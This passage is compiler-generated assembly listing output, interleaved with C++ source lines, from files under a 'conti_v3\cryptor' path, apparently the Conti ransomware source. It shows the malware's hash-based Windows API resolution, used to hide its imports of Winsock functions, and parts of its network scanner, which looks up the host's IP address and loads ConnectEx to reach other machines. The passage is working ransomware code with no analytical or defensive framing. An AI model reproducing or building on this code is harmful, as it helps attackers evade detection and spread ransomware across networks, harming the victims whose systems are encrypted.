  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 0c	 lea	 r9d, QWORD PTR [rdx+12]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 897  : 	return pFunction(lpsaAddress, dwAddressLength, lpProtocolInfo, lpszAddressString, lpdwAddressStringLength);

  00024	45 33 c0	 xor	 r8d, r8d
  00027	4c 8b cb	 mov	 r9, rbx
  0002a	48 8b cf	 mov	 rcx, rdi
  0002d	41 8d 50 10	 lea	 edx, QWORD PTR [r8+16]

; 898  : }

  00031	48 8b 5c 24 40	 mov	 rbx, QWORD PTR [rsp+64]
  00036	48 83 c4 30	 add	 rsp, 48			; 00000030H
  0003a	5f		 pop	 rdi

; 897  : 	return pFunction(lpsaAddress, dwAddressLength, lpProtocolInfo, lpszAddressString, lpdwAddressStringLength);

  0003b	48 ff e0	 rex_jmp rax
?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z ENDP ; pWSAAddressToStringW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z
_TEXT	SEGMENT
af$dead$ = 64
type$dead$ = 72
protocol$dead$ = 80
lpProtocolInfo$dead$ = 88
g$dead$ = 96
dwFlags$ = 104
?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z PROC	; pWSASocketW, COMDAT

; 908  : {

$LN4:
  00000	48 83 ec 38	 sub	 rsp, 56			; 00000038H

; 909  : 	SOCKET(WINAPI * pFunction)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD);
; 910  : 	pFunction = (SOCKET(WINAPI*)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xa7922856, 32);//GetProcAddress(hWs2_32, OBFA("WSASocketW"));

  00004	ba 15 00 00 00	 mov	 edx, 21
  00009	41 b8 56 28 92
	a7		 mov	 r8d, -1483593642	; a7922856H
  0000f	44 8d 4a 0b	 lea	 r9d, QWORD PTR [rdx+11]
  00013	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 911  : 	return pFunction(af, type, protocol, lpProtocolInfo, g, dwFlags);

  00018	45 33 c9	 xor	 r9d, r9d
  0001b	c7 44 24 60 00
	00 00 00	 mov	 DWORD PTR g$dead$[rsp], 0
  00023	41 8d 51 01	 lea	 edx, QWORD PTR [r9+1]
  00027	8d 4a 01	 lea	 ecx, QWORD PTR [rdx+1]
  0002a	45 8d 41 06	 lea	 r8d, QWORD PTR [r9+6]

; 912  : }

  0002e	48 83 c4 38	 add	 rsp, 56			; 00000038H

; 911  : 	return pFunction(af, type, protocol, lpProtocolInfo, g, dwFlags);

  00032	48 ff e0	 rex_jmp rax
?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z ENDP	; pWSASocketW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pbind@@YAH_KPEBUsockaddr@@H@Z
_TEXT	SEGMENT
s$ = 48
addr$ = 56
namelen$dead$ = 64
?pbind@@YAH_KPEBUsockaddr@@H@Z PROC			; pbind, COMDAT

; 919  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 920  : 	int(WINAPI * pFunction)(SOCKET, const sockaddr*, int);
; 921  : 	pFunction = (int(WINAPI*)(SOCKET, const sockaddr*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x6291cb76, 31);//GetProcAddress(hWs2_32, OBFA("bind"));

  0000d	41 b8 76 cb 91
	62		 mov	 r8d, 1653721974		; 6291cb76H
  00013	ba 15 00 00 00	 mov	 edx, 21
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 0a	 lea	 r9d, QWORD PTR [rdx+10]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 922  : 	return pFunction(s, addr, namelen);

  00024	41 b8 10 00 00
	00		 mov	 r8d, 16
  0002a	48 8b d3	 mov	 rdx, rbx
  0002d	48 8b cf	 mov	 rcx, rdi

; 923  : }

  00030	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  00035	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00039	5f		 pop	 rdi

; 922  : 	return pFunction(s, addr, namelen);

  0003a	48 ff e0	 rex_jmp rax
?pbind@@YAH_KPEBUsockaddr@@H@Z ENDP			; pbind
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?psetsockopt@@YAH_KHHPEBDH@Z
_TEXT	SEGMENT
s$ = 64
level$dead$ = 72
optname$dead$ = 80
optval$dead$ = 88
optlen$dead$ = 96
?psetsockopt@@YAH_KHHPEBDH@Z PROC			; psetsockopt, COMDAT

; 932  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 30	 sub	 rsp, 48			; 00000030H

; 933  : 	int(WINAPI * pFunction)(SOCKET, int, int, const char*, int);
; 934  : 	pFunction = (int(WINAPI*)(SOCKET, int, int, const char*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x33b7fed1, 30);//GetProcAddress(hWs2_32, OBFA("setsockopt"));

  00006	ba 15 00 00 00	 mov	 edx, 21
  0000b	41 b8 d1 fe b7
	33		 mov	 r8d, 867696337		; 33b7fed1H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 09	 lea	 r9d, QWORD PTR [rdx+9]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 935  : 	return pFunction(s, level, optname, optval, optlen);

  0001d	45 33 c9	 xor	 r9d, r9d
  00020	c7 44 24 60 00
	00 00 00	 mov	 DWORD PTR optlen$dead$[rsp], 0
  00028	ba ff ff 00 00	 mov	 edx, 65535		; 0000ffffH
  0002d	41 b8 10 70 00
	00		 mov	 r8d, 28688		; 00007010H
  00033	48 8b cb	 mov	 rcx, rbx

; 936  : }

  00036	48 83 c4 30	 add	 rsp, 48			; 00000030H
  0003a	5b		 pop	 rbx

; 935  : 	return pFunction(s, level, optname, optval, optlen);

  0003b	48 ff e0	 rex_jmp rax
?psetsockopt@@YAH_KHHPEBDH@Z ENDP			; psetsockopt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pgetsockopt@@YAH_KHHPEADPEAH@Z
_TEXT	SEGMENT
s$ = 64
level$dead$ = 72
optname$dead$ = 80
optval$ = 88
optlen$ = 96
?pgetsockopt@@YAH_KHHPEADPEAH@Z PROC			; pgetsockopt, COMDAT

; 945  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 30	 sub	 rsp, 48			; 00000030H

; 946  : 	int(WINAPI * pFunction)(SOCKET, int, int, char*, int*);
; 947  : 	pFunction = (int(WINAPI*)(SOCKET, int, int, char*, int*))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x1c5ed854, 29);//GetProcAddress(hWs2_32, OBFA("getsockopt"));

  0000a	ba 15 00 00 00	 mov	 edx, 21
  0000f	49 8b d9	 mov	 rbx, r9
  00012	41 b8 54 d8 5e
	1c		 mov	 r8d, 475977812		; 1c5ed854H
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 08	 lea	 r9d, QWORD PTR [rdx+8]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 948  : 	return pFunction(s, level, optname, optval, optlen);

  00024	4c 8b cb	 mov	 r9, rbx
  00027	41 b8 0c 70 00
	00		 mov	 r8d, 28684		; 0000700cH
  0002d	ba ff ff 00 00	 mov	 edx, 65535		; 0000ffffH
  00032	48 8b cf	 mov	 rcx, rdi

; 949  : }

  00035	48 8b 5c 24 40	 mov	 rbx, QWORD PTR [rsp+64]
  0003a	48 83 c4 30	 add	 rsp, 48			; 00000030H
  0003e	5f		 pop	 rdi

; 948  : 	return pFunction(s, level, optname, optval, optlen);

  0003f	48 ff e0	 rex_jmp rax
?pgetsockopt@@YAH_KHHPEADPEAH@Z ENDP			; pgetsockopt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pshutdown@@YAH_KH@Z
_TEXT	SEGMENT
s$ = 48
how$dead$ = 56
?pshutdown@@YAH_KH@Z PROC				; pshutdown, COMDAT

; 955  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 956  : 	int(WINAPI * pFunction)(SOCKET, int);
; 957  : 	pFunction = (int(WINAPI*)(SOCKET, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8f9390c3, 28);//GetProcAddress(hWs2_32, OBFA("shutdown"));

  00006	ba 15 00 00 00	 mov	 edx, 21
  0000b	41 b8 c3 90 93
	8f		 mov	 r8d, -1886154557	; 8f9390c3H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 07	 lea	 r9d, QWORD PTR [rdx+7]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 958  : 	return pFunction(s, how);

  0001d	ba 01 00 00 00	 mov	 edx, 1
  00022	48 8b cb	 mov	 rcx, rbx

; 959  : }

  00025	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00029	5b		 pop	 rbx

; 958  : 	return pFunction(s, how);

  0002a	48 ff e0	 rex_jmp rax
?pshutdown@@YAH_KH@Z ENDP				; pshutdown
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWSAStartup@@YAHGPEAUWSAData@@@Z
_TEXT	SEGMENT
wVersionRequired$dead$ = 48
lpWSAData$ = 56
?pWSAStartup@@YAHGPEAUWSAData@@@Z PROC			; pWSAStartup, COMDAT

; 965  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  00006	48 8b da	 mov	 rbx, rdx

; 966  : 	int(WINAPI * pFunction)(WORD, LPWSADATA);
; 967  : 	pFunction = (int(WINAPI*)(WORD, LPWSADATA))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x86ffe89f, 27);//GetProcAddress(hWs2_32, OBFA("WSAStartup"));

  00009	41 b8 9f e8 ff
	86		 mov	 r8d, -2030049121	; 86ffe89fH
  0000f	ba 15 00 00 00	 mov	 edx, 21
  00014	44 8d 4a 06	 lea	 r9d, QWORD PTR [rdx+6]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 968  : 	return pFunction(wVersionRequired, lpWSAData);

  0001d	b9 02 02 00 00	 mov	 ecx, 514		; 00000202H
  00022	48 8b d3	 mov	 rdx, rbx

; 969  : }

  00025	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00029	5b		 pop	 rbx

; 968  : 	return pFunction(wVersionRequired, lpWSAData);

  0002a	48 ff e0	 rex_jmp rax
?pWSAStartup@@YAHGPEAUWSAData@@@Z ENDP			; pWSAStartup
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWSACleanup@@YAHXZ
_TEXT	SEGMENT
?pWSACleanup@@YAHXZ PROC				; pWSACleanup, COMDAT

; 972  : {

$LN4:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 973  : 	int(WINAPI * pFunction)();
; 974  : 	pFunction = (int(WINAPI*)())getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xc84f6620, 26);//GetProcAddress(hWs2_32, OBFA("WSACleanup"));

  00004	ba 15 00 00 00	 mov	 edx, 21
  00009	41 b8 20 66 4f
	c8		 mov	 r8d, -934320608		; c84f6620H
  0000f	44 8d 4a 05	 lea	 r9d, QWORD PTR [rdx+5]
  00013	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 976  : }

  00018	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 975  : 	return pFunction();

  0001c	48 ff e0	 rex_jmp rax
?pWSACleanup@@YAHXZ ENDP				; pWSACleanup
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pStrStrIA@@YAPEBDPEBD0@Z
_TEXT	SEGMENT
pszFirst$ = 48
pszSrch$ = 56
?pStrStrIA@@YAPEBDPEBD0@Z PROC				; pStrStrIA, COMDAT

; 994  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 995  : 	PCSTR(WINAPI * pFunction)(PCSTR, PCSTR);
; 996  : 	pFunction = (PCSTR(WINAPI*)(PCSTR, PCSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0x4c07f7e3, 24);//GetProcAddress(hShlwapi, OBFA("StrStrIA"));

  0000d	41 b8 e3 f7 07
	4c		 mov	 r8d, 1275590627		; 4c07f7e3H
  00013	ba 16 00 00 00	 mov	 edx, 22
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 02	 lea	 r9d, QWORD PTR [rdx+2]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 997  : 	return pFunction(pszFirst, pszSrch);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 998  : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 997  : 	return pFunction(pszFirst, pszSrch);

  00034	48 ff e0	 rex_jmp rax
?pStrStrIA@@YAPEBDPEBD0@Z ENDP				; pStrStrIA
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pinet_ntoa@@YAPEADUin_addr@@@Z
_TEXT	SEGMENT
in$ = 48
?pinet_ntoa@@YAPEADUin_addr@@@Z PROC			; pinet_ntoa, COMDAT

; 1288 : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 1289 : 	char*(WINAPI * pFunction)(in_addr);
; 1290 : 	pFunction = (char*(WINAPI*)(in_addr))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x464a1063, 2);

  00006	ba 15 00 00 00	 mov	 edx, 21
  0000b	41 b8 63 10 4a
	46		 mov	 r8d, 1179258979		; 464a1063H
  00011	8b d9		 mov	 ebx, ecx
  00013	44 8d 4a ed	 lea	 r9d, QWORD PTR [rdx-19]
  00017	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1291 : 	return pFunction(in);

  0001c	8b cb		 mov	 ecx, ebx

; 1292 : }

  0001e	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00022	5b		 pop	 rbx

; 1291 : 	return pFunction(in);

  00023	48 ff e0	 rex_jmp rax
?pinet_ntoa@@YAPEADUin_addr@@@Z ENDP			; pinet_ntoa
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?GetCurrentIpAddress@@YAKXZ
_TEXT	SEGMENT
szHostName$ = 32
__$ArrayPad$ = 288
?GetCurrentIpAddress@@YAKXZ PROC			; GetCurrentIpAddress, COMDAT

; 89   : {

$LN13:
  00000	48 81 ec 38 01
	00 00		 sub	 rsp, 312		; 00000138H
  00007	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0000e	48 33 c4	 xor	 rax, rsp
  00011	48 89 84 24 20
	01 00 00	 mov	 QWORD PTR __$ArrayPad$[rsp], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 845  : 	pFunction = (int (WINAPI*)(char*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8ec21b05, 37);//GetProcAddress(hWs2_32, OBFA("gethostname"));

  00019	ba 15 00 00 00	 mov	 edx, 21
  0001e	41 b8 05 1b c2
	8e		 mov	 r8d, -1899881723	; 8ec21b05H
  00024	44 8d 4a 10	 lea	 r9d, QWORD PTR [rdx+16]
  00028	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 846  : 	return pFunction(name, namelen);

  0002d	ba 00 01 00 00	 mov	 edx, 256		; 00000100H
  00032	48 8d 4c 24 20	 lea	 rcx, QWORD PTR szHostName$[rsp]
  00037	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 93   : 	if (SOCKET_ERROR == (INT)pgethostname(szHostName, 256)) {

  00039	83 f8 ff	 cmp	 eax, -1
  0003c	74 22		 je	 SHORT $LN11@GetCurrent
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 835  : 	pFunction = (hostent * (WINAPI*)(const char*))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x3f6d3769, 38);//GetProcAddress(hWs2_32, OBFA("gethostbyname"));

  0003e	ba 15 00 00 00	 mov	 edx, 21
  00043	41 b8 69 37 6d
	3f		 mov	 r8d, 1064122217		; 3f6d3769H
  00049	44 8d 4a 11	 lea	 r9d, QWORD PTR [rdx+17]
  0004d	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 836  : 	return pFunction(name);

  00052	48 8d 4c 24 20	 lea	 rcx, QWORD PTR szHostName$[rsp]
  00057	ff d0		 call	 rax
  00059	48 89 05 00 00
	00 00		 mov	 QWORD PTR ?g_HostEntry@@3PEAUhostent@@EA, rax ; g_HostEntry
$LN11@GetCurrent:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 103  : }

  00060	33 c0		 xor	 eax, eax
  00062	48 8b 8c 24 20
	01 00 00	 mov	 rcx, QWORD PTR __$ArrayPad$[rsp]
  0006a	48 33 cc	 xor	 rcx, rsp
  0006d	e8 00 00 00 00	 call	 __security_check_cookie
  00072	48 81 c4 38 01
	00 00		 add	 rsp, 312		; 00000138H
  00079	c3		 ret	 0
?GetCurrentIpAddress@@YAKXZ ENDP			; GetCurrentIpAddress
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?GetConnectEX@@YAHXZ
_TEXT	SEGMENT
guid$ = 80
dwBytes$ = 96
__$ArrayPad$ = 104
?GetConnectEX@@YAHXZ PROC				; GetConnectEX, COMDAT

; 108  : {

$LN18:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 70	 sub	 rsp, 112		; 00000070H
  0000a	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00011	48 33 c4	 xor	 rax, rsp
  00014	48 89 44 24 68	 mov	 QWORD PTR __$ArrayPad$[rsp], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 910  : 	pFunction = (SOCKET(WINAPI*)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xa7922856, 32);//GetProcAddress(hWs2_32, OBFA("WSASocketW"));

  00019	ba 15 00 00 00	 mov	 edx, 21
  0001e	41 b8 56 28 92
	a7		 mov	 r8d, -1483593642	; a7922856H
  00024	44 8d 4a 0b	 lea	 r9d, QWORD PTR [rdx+11]
  00028	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 911  : 	return pFunction(af, type, protocol, lpProtocolInfo, g, dwFlags);

  0002d	33 db		 xor	 ebx, ebx
  0002f	45 33 c9	 xor	 r9d, r9d
  00032	89 5c 24 28	 mov	 DWORD PTR [rsp+40], ebx
  00036	89 5c 24 20	 mov	 DWORD PTR [rsp+32], ebx
  0003a	8d 53 01	 lea	 edx, QWORD PTR [rbx+1]
  0003d	8d 4b 02	 lea	 ecx, QWORD PTR [rbx+2]
  00040	44 8d 43 06	 lea	 r8d, QWORD PTR [rbx+6]
  00044	ff d0		 call	 rax
  00046	48 8b f8	 mov	 rdi, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 113  : 	if (sock == INVALID_SOCKET)

  00049	48 83 f8 ff	 cmp	 rax, -1
  0004d	0f 84 91 00 00
	00		 je	 $LN12@GetConnect
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 874  : 	pFunction = (int(WINAPI*)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8460e293, 35);//GetProcAddress(hWs2_32, OBFA("WSAIoctl"));

  00053	8d 53 15	 lea	 edx, QWORD PTR [rbx+21]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 116  : 	GUID guid = WSAID_CONNECTEX;

  00056	c7 44 24 50 b9
	07 a2 25	 mov	 DWORD PTR guid$[rsp], 631375801 ; 25a207b9H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 874  : 	pFunction = (int(WINAPI*)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8460e293, 35);//GetProcAddress(hWs2_32, OBFA("WSAIoctl"));

  0005e	44 8d 4b 23	 lea	 r9d, QWORD PTR [rbx+35]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 116  : 	GUID guid = WSAID_CONNECTEX;

  00062	c7 44 24 54 f3
	dd 60 46	 mov	 DWORD PTR guid$[rsp+4], 1180753395 ; 4660ddf3H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 874  : 	pFunction = (int(WINAPI*)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8460e293, 35);//GetProcAddress(hWs2_32, OBFA("WSAIoctl"));

  0006a	41 b8 93 e2 60
	84		 mov	 r8d, -2074025325	; 8460e293H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 116  : 	GUID guid = WSAID_CONNECTEX;

  00070	c7 44 24 58 8e
	e9 76 e5	 mov	 DWORD PTR guid$[rsp+8], -445191794 ; e576e98eH
  00078	c7 44 24 5c 8c
	74 06 3e	 mov	 DWORD PTR guid$[rsp+12], 1040610444 ; 3e06748cH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 874  : 	pFunction = (int(WINAPI*)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8460e293, 35);//GetProcAddress(hWs2_32, OBFA("WSAIoctl"));

  00080	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 875  : 	return pFunction(s, dwIoControlCode, lpvInBuffer, cbInBuffer, lpvOutBuffer, cbOutBuffer, lpcbBytesReturned, lpOverlapped, lpCompletionRoutine);

  00085	48 89 5c 24 40	 mov	 QWORD PTR [rsp+64], rbx
  0008a	48 8d 4c 24 60	 lea	 rcx, QWORD PTR dwBytes$[rsp]
  0008f	48 89 5c 24 38	 mov	 QWORD PTR [rsp+56], rbx
  00094	44 8d 4b 10	 lea	 r9d, QWORD PTR [rbx+16]
  00098	48 89 4c 24 30	 mov	 QWORD PTR [rsp+48], rcx
  0009d	4c 8d 44 24 50	 lea	 r8, QWORD PTR guid$[rsp]
  000a2	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_ConnectEx@@3P6AH_KPEBUsockaddr@@HPEAXKPEAKPEAU_OVERLAPPED@@@ZEA ; g_ConnectEx
  000a9	c7 44 24 28 08
	00 00 00	 mov	 DWORD PTR [rsp+40], 8
  000b1	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  000b6	ba 06 00 00 c8	 mov	 edx, -939524090		; c8000006H
  000bb	48 8b cf	 mov	 rcx, rdi
  000be	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 122  : 	if (rc != 0)

  000c0	85 c0		 test	 eax, eax
  000c2	75 20		 jne	 SHORT $LN12@GetConnect
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 883  : 	pFunction = (int(WINAPI*)(SOCKET))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x3e3c66ba, 34);//GetProcAddress(hWs2_32, OBFA("closesocket"));

  000c4	8d 53 15	 lea	 edx, QWORD PTR [rbx+21]
  000c7	41 b8 ba 66 3c
	3e		 mov	 r8d, 1044145850		; 3e3c66baH
  000cd	44 8d 4b 22	 lea	 r9d, QWORD PTR [rbx+34]
  000d1	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 884  : 	return pFunction(s);

  000d6	48 8b cf	 mov	 rcx, rdi
  000d9	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 126  : 	if (rc != 0)

  000db	85 c0		 test	 eax, eax
  000dd	0f 94 c3	 sete	 bl
  000e0	8b c3		 mov	 eax, ebx
  000e2	eb 02		 jmp	 SHORT $LN1@GetConnect
$LN12@GetConnect:

; 127  : 		return FALSE;

  000e4	33 c0		 xor	 eax, eax
$LN1@GetConnect:

; 128  : 
; 129  : 	return TRUE;
; 130  : }

  000e6	48 8b 4c 24 68	 mov	 rcx, QWORD PTR __$ArrayPad$[rsp]
  000eb	48 33 cc	 xor	 rcx, rsp
  000ee	e8 00 00 00 00	 call	 __security_check_cookie
  000f3	48 8b 9c 24 80
	00 00 00	 mov	 rbx, QWORD PTR [rsp+128]
  000fb	48 83 c4 70	 add	 rsp, 112		; 00000070H
  000ff	5f		 pop	 rdi
  00100	c3		 ret	 0
?GetConnectEX@@YAHXZ ENDP				; GetConnectEX
_TEXT	ENDS
; Function compile flags: /Ogtpy
